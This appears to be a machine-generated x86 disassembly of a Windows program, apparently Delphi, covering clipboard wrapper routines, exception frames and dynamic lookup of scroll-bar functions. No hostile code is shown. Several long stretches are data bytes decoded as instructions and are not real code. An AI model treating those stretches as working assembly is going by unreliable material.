push ebp
push sub_4312f7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4312fe
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_4060f8
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_431304
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] ah
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x13 ] ch
inc ebx
add [ eax ] dl
imul esi [ eax + 0x62 ] 0x6472616f
nop
js r-xdata
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bh
sbb al [ ebx ]
mov ah 0x17
inc ebx
add [ edi + ebx * 4 ] ch
inc ecx
add [ ecx + ebx ] ah
inc ebx
add [ eax - 0x67ffbcec ] al
adc eax [ ebx ]
clc
adc eax [ ebx ]
and al 0x14
inc ebx
add [ edx ] cl
push esp
inc ebx
insb
jne r-xdata
inc ebx
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
dec esp
adc eax [ ebx ]
xchg esp eax
call [ edx + 0x14 ]
retn
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4313d0
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4313d7
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
sub_4313f8
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_4211f4
sub_431424
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_431a9c
call sub_421140
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
sub_431480
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4314a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_431572
push [ fs : edx ]
mov [ fs : edx ] esp
push ebx
push 0x2002
call GlobalAlloc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_431544
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
xor edx edx
push ebp
push sub_431533
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
mov eax edi
mov ecx ebx
call sub_4030fc
mov eax [ ebp - 0x4 ]
call sub_4313dc
mov eax [ ebp - 0x8 ]
push eax
movzx eax si
push eax
call SetClipboardData
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43153a
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
sub_43153a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431579
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_431549
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
call sub_404eec
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431579
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_431584
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4315f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_405530
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_405728
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315fd
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_431604
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx edi
test ebx ebx
je r-xdata
inc ebx
push ebx
mov eax edi
call sub_4059dc
mov ecx eax
mov dx 0x1
mov eax esi
call sub_4314a0
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_431630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4316d8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_427500
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
mov edi eax
push edi
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_427410
call sub_404f70
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4316e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431740
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431747
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_431750
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_4317a5
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4317ac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4317b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_431630
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4316e8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_419f24
mov edx ebx
mov eax esi
call sub_431750
jmp r-xdata
pop esi
pop ebx
retn
sub_43181c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431891
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4313dc
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_4274d4
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431898
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_4318a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431915
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4313dc
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43191c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_431924
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43181c
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_419e40
mov edx ebx
mov eax esi
call sub_4318a0
jmp r-xdata
pop esi
pop ebx
retn
sub_431970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_4319b4
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax bx
push eax
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4319bb
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4319c4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_431a33
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a3a
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_427500
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_431a44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
movzx eax bx
push eax
call IsClipboardFormatAvailable
test eax eax
jne r-xdata
mov al 0x1
cmp bx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_4319c4
pop ecx
test al al
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_431a9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431ac6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431acb
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_404eec
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431af8
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_431b2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431b5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b64
retn
mov eax [ rw-data ]
call sub_404650
sub_431c5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a5f8
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_431c98
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_431ccc
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_431cf4
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_431f76
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431f9d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431fa4
retn
sub_431fa9
pop ds
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
pop ds
inc ebx
add [ eax ] dh
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edx + 0x23480043 ] bh
inc ebx
add [ eax + 0x22 ] cl
inc ebx
add [ esi ] cl
push esp
push esp
push 0x53656d65
jb r-xdata
add [ eax + eax + 0x6f ] ch
add [ edx ] dh
add [ gs : edx ] dh
bound eax [ eax ]
popad
add [ edx ] dh
add [ eax ] al
push 0x61006500
add [ eax + eax + 0x65 ] ah
add [ edx ] dh
add [ eax ] al
add [ eax ] al
insb
add [ ecx ] ch
jae r-xdata
imul esp [ ebx + 0x65 ] 0xffff9073
je r-xdata
jbe r-xdata
imul eax [ eax ] 0x770065
add [ eax ] al
add [ eax ] al
insd
add [ ebp ] ah
outsb
add [ ebp ] dh
add [ eax ] al
add [ eax ] al
jo r-xdata
popad
add [ edi ] ah
add [ gs : eax ] al
add [ eax ] al
add [ eax ] dh
jb r-xdata
outsd
add [ edi ] ah
jb r-xdata
add [ gs : ebx ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ gs : edx ] ah
popad
add [ edx ] dh
add [ eax ] al
jae r-xdata
arpl [ eax ] ax
jb r-xdata
outsd
add [ eax + eax + 0x6c ] ch
add [ edx ] ah
popad
add [ edx ] dh
add [ eax ] al
jae r-xdata
jo r-xdata
imul eax [ eax ] 0x6e
add [ eax ] al
jae r-xdata
je r-xdata
popad
add [ edx ] dh
je r-xdata
jo r-xdata
popad
add [ esi ] ch
add [ gs : eax + eax ] ch
add [ eax ] al
add [ ebx ] dh
je r-xdata
popad
add [ eax + eax + 0x75 ] dh
add [ ebx ] dh
add [ eax ] al
add [ eax ] al
je r-xdata
popad
add [ edx ] ah
add [ eax ] al
je r-xdata
popad
add [ ebx ] dh
imul eax [ eax ] 0x62
add [ ecx ] ah
outsb
add [ eax + eax ] ah
add [ eax ] al
add [ eax + eax + 0x61 ] dh
add [ ebx ] dh
imul eax [ eax ] 0x62
add [ ecx ] ah
jb r-xdata
add [ eax ] al
je r-xdata
outsd
add [ edi ] ch
insb
add [ edx ] ah
popad
add [ edx ] dh
add [ eax ] al
je r-xdata
outsd
add [ edi ] ch
insb
add [ eax + eax + 0x69 ] dh
add [ eax ] dh
add [ eax ] al
je r-xdata
jb r-xdata
popad
add [ ebx ] ah
imul eax [ eax ] 0x62
add [ ecx ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
popad
add [ ecx ] bh
outsb
add [ edi ] ch
je r-xdata
imul eax [ eax ] 0x790066
add [ eax ] al
add [ eax ] al
je r-xdata
jb r-xdata
add [ gs : ebp ] ah
jbe r-xdata
imul eax [ eax ] 0x770065
add [ eax ] al
add [ eax ] al
ja r-xdata
imul eax [ eax ] 0x64006e
outsd
add [ edi ] dh
add [ eax ] al
add [ eax ] al
sub_4321d0
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx 0x64
mov edx [ rw-data ]
mov eax ebx
call sub_451b4c
cmp eax 0x64
sete al
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
sub_432248
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
call sub_42f204
mov [ esi + 0x5 ] al
mov eax r-xdata
call sub_40e3a4
cmp eax 0x60000
setae al
mov [ esi + 0x4 ] al
mov eax esi
call sub_432a68
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4322b9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_43235c
call sub_42f044
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4322f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
movzx eax bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
movzx eax bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43235c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4323a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_4322f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4323ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_4322f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_432430
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
movzx edx [ ebx ]
mov eax esi
call sub_4322f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_432498
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4324d4
mov [ ecx ] 0xa
movzx eax dl
cmp eax 0x11
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_4324ed ]
jmp [ eax * 4 + jump_table_4324ff ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_432570
mov [ ecx ] 0x17
movzx eax dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_43258d ]
jmp [ eax * 4 + jump_table_4325f6 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
